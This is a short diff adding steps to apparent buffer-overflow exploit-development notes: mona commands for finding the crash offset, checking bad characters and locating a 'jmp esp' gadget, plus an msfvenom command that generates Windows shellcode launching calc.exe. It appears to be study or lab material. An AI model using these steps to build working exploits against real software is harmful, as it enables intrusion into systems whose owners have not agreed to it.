@@ -30,3 +30,12 @@ r2
 # find offset
 !mona pattern_create 1024
 !mona pattern_offset 39654138
+# find bad chars
+sprintf = "\x00\x0A"
+
+# find gadget
+!mona jmp -r esp -cpb "\x00\x0A"  --> 080416BF, 080414C3  (little endian)
+
+# create shellcode
+# CALC
+msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
